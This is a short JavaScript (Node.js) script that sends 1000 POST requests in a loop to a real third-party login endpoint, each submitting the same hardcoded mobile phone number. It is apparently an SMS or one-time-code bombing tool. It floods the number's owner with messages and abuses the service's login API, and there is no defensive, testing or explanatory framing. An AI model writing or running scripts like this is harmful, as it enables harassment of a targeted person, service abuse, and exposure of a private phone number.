const axios = require("axios");

function sendRequests() {
  const payload = new URLSearchParams();
  payload.append("mobile", "09356202886");

  const loopCount = 1000; // Change this to the desired number of requests

  for (let i = 0; i < loopCount; i++) {
    const requestConfig = {
      url: "https://api.vesal.co/v2/auth/login",
      method: "post",
      data: payload,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    };

    axios(requestConfig)
      .then((response) => {
        console.log(`Request ${i + 1} successful. Response:`, response.data);
      })
      .catch((error) => {
        // console.error(`Request ${i + 1} failed. Error:`, error.response.data);
      });
  }
}

sendRequests();
